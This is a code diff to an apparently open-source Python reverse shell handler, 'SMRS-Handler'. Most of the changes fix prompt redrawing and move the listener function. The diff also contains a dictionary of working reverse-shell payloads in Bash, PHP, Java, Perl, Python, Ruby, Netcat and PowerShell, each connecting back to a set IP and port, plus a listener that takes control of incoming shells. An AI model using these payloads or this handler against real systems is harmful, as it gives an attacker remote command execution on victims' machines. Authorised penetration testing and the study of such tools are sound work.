@@ -5,6 +5,7 @@ import sys
 import select
 import queue
 import os
+import time
 from colorama import Fore, init
 from pygments import highlight
 from pygments.lexers import get_lexer_by_name
@@ -23,6 +24,8 @@ IP = '127.0.0.1'
 HOST = '0.0.0.0'
 PORT = 4444
 
+PROMPT = "[>] "
+
 clients = {}
 output_queues = {}
 client_lock = threading.Lock()
@@ -30,41 +33,56 @@ print_lock = threading.Lock()
 current_client = None
 next_id = 1
 current_input = ""
+input_ready = False   # <-- prevent background threads from drawing prompt before main is ready
 
 SHELLS = {
     "Bash": f'/bin/bash -i >& /dev/tcp/{IP}/{PORT} 0>&1',
     "PHP": f'php -r \'$sock=fsockopen("{IP}",{PORT});exec("/bin/sh -i <&3 >&3 2>&3");\'',
-    "Java": f'r = Runtime.getRuntime()\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{IP}/{PORT}; cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[])\np.waitFor()',
-    "Perl": f'perl -e \'use Socket;$i="{IP}";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'',
-    "Python": f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
+    "Java": f'r=Runtime.getRuntime()\np=r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{IP}/{PORT};cat<&5|while read line;do $line 2>&5 >&5;done"] as String[])\np.waitFor()',
+    "Perl": f'perl -e \'use Socket;$i="{IP}";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh","-i");}};\'',
+    "Python": f'python -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{IP}",{PORT}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];p=subprocess.call(["/bin/sh","-i"]);\'',
     "Ruby": f'ruby -rsocket -e \'f=TCPSocket.open("{IP}",{PORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
     "Netcat": f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f',
-    "PowerShell": f'$sm=(New-Object Net.Sockets.TCPClient("{IP}",{PORT})).GetStream();[byte[]]$bt=0..255|%{{0}};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}}',
+    "PowerShell": f'$sm=(New-Object Net.Sockets.TCPClient("{IP}",{PORT})).GetStream();[byte[]]$b=0..255|%{{0}};while(($i=$sm.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$s=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($s,0,$s.Length)}}'
 }
 
 
+def _redraw_prompt():
+    """Redraw prompt only when main input loop is ready to receive input."""
+    if not input_ready:
+        return
+    sys.stdout.write('\r\033[K' + PROMPT + current_input)
+    sys.stdout.flush()
+
+
 def safe_print(msg: str):
-    """Thread-safe print that preserves input prompt."""
     with print_lock:
-        sys.stdout.write('\r\033[K' + msg + '\n')
+        sys.stdout.write('\r\033[K' + msg.rstrip() + '\n')
         sys.stdout.flush()
+        # Only background threads should call _redraw_prompt — and only if input is ready
         if threading.current_thread() is not threading.main_thread():
-            sys.stdout.write(f"[>] {current_input}")
-            sys.stdout.flush()
+            _redraw_prompt()
 
 
 def safe_write(data: str):
-    """Thread-safe write for client output."""
+    if not data:
+        return
+    if isinstance(data, bytes):
+        try:
+            data = data.decode('utf-8', errors='ignore')
+        except Exception:
+            data = str(data)
     with print_lock:
         sys.stdout.write('\r\033[K' + data)
+        if not data.endswith('\n'):
+            sys.stdout.write('\n')
         sys.stdout.flush()
         if threading.current_thread() is not threading.main_thread():
-            sys.stdout.write(f"[>] {current_input}")
-            sys.stdout.flush()
+            _redraw_prompt()
 
 
-def read_line(prompt="[>] "):
-    """Cross-platform raw input reader with backspace & interrupt support."""
+def read_line(prompt=PROMPT):
+    """Cross-platform raw input with proper newline handling (no staircase)."""
     global current_input
     sys.stdout.write(prompt)
     sys.stdout.flush()
@@ -76,9 +94,11 @@ def read_line(prompt="[>] "):
             if msvcrt.kbhit():
                 ch = msvcrt.getch()
                 if ch in (b'\r', b'\n'):
-                    print()
+                    sys.stdout.write('\r\n')
+                    sys.stdout.flush()
+                    result = line
                     current_input = ""
-                    return line
+                    return result
                 elif ch == b'\x08' and line:
                     line = line[:-1]
                     current_input = line
@@ -106,9 +126,11 @@ def read_line(prompt="[>] "):
             while True:
                 ch = sys.stdin.read(1)
                 if ch in ('\r', '\n'):
-                    print()
+                    sys.stdout.write('\r\n')  # ensures proper cursor reset in raw mode
+                    sys.stdout.flush()
+                    result = line
                     current_input = ""
-                    return line
+                    return result
                 elif ch == '\x7f' and line:
                     line = line[:-1]
                     current_input = line
@@ -137,7 +159,7 @@ def banner():
 {Fore.RED}  ____) || |  | |_| | \\ \\ _ ____) |{Fore.RESET}  | |  | | (_| | | | | (_| | |  __/ |
 {Fore.RED} |_____(_)_|  |_(_)_|  \\_(_)_____(_){Fore.RESET} |_|  |_|\\__,_|_| |_|\\__,_|_|\\___|_|
  {Fore.RED}Simple Multi Reverse Shell Handler{Fore.RESET}
- {Fore.GREEN}By MRITARI{Fore.RESET} |{Fore.CYAN} Version {VERSION}
+ {Fore.GREEN}By MRITARI{Fore.RESET} | Version {VERSION}
  {Fore.BLUE}https://github.com/MRITARI/SMRS-Handler{Fore.RESET}
 
 {Fore.BLUE}[i]{Fore.RESET} Type {Fore.CYAN}'exit'{Fore.RESET} to quit and {Fore.CYAN}'help'{Fore.RESET} for commands.
@@ -188,14 +210,44 @@ def output_worker():
         threading.Event().wait(0.1)
 
 
-def interactive_shell():
-    global current_client
-    threading.Thread(target=listener, daemon=True).start()
-    threading.Thread(target=output_worker, daemon=True).start()
+def listener():
+    global next_id, current_client
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    server.bind((HOST, PORT))
+    server.listen(5)
+    safe_print(f"{Fore.CYAN}[*]{Fore.RESET} Listening on {HOST}:{PORT}")
 
     while True:
         try:
-            cmd = read_line("[>] ").strip()
+            sock, addr = server.accept()
+            sock.setblocking(False)
+            with client_lock:
+                cid = next_id
+                clients[cid] = (sock, addr)
+                next_id += 1
+            threading.Thread(target=handle_client, args=(sock, addr, cid), daemon=True).start()
+            if len(clients) == 1:
+                current_client = cid
+                safe_print(f"{Fore.CYAN}[*]{Fore.RESET} Auto-selected client {cid}")
+        except Exception as e:
+            safe_print(f"{Fore.YELLOW}[!]{Fore.RESET} Listener error: {e}")
+            break
+
+
+def interactive_shell():
+    global current_client, input_ready
+    # Start background threads first; they will NOT redraw the prompt until input_ready=True
+    threading.Thread(target=listener, daemon=True).start()
+    time.sleep(0.15)  # small pause so initial logs are printed in order
+    threading.Thread(target=output_worker, daemon=True).start()
+
+    # Now the main loop is ready to show the prompt and accept input
+    input_ready = True
+
+    while True:
+        try:
+            cmd = read_line(PROMPT).strip()
             if not cmd:
                 continue
 
@@ -275,31 +327,6 @@ def interactive_shell():
             safe_print(f"{Fore.BLUE}[i]{Fore.RESET} Use 'exit' to quit.")
         except Exception as e:
             safe_print(f"{Fore.RED}[Error]{Fore.RESET} {e}")
-
-
-def listener():
-    global next_id, current_client
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    server.bind((HOST, PORT))
-    server.listen(5)
-    safe_print(f"{Fore.CYAN}[*]{Fore.RESET} Listening on {Fore.GREEN}{HOST}:{PORT}{Fore.RESET}")
-
-    while True:
-        try:
-            sock, addr = server.accept()
-            sock.setblocking(False)
-            with client_lock:
-                cid = next_id
-                clients[cid] = (sock, addr)
-                next_id += 1
-            threading.Thread(target=handle_client, args=(sock, addr, cid), daemon=True).start()
-            if len(clients) == 1:
-                current_client = cid
-                safe_print(f"{Fore.CYAN}[*]{Fore.RESET} Auto-selected client {cid}")
-        except Exception as e:
-            safe_print(f"{Fore.YELLOW}[!]{Fore.RESET} Listener error: {e}")
-            break
 
 
 if __name__ == "__main__":
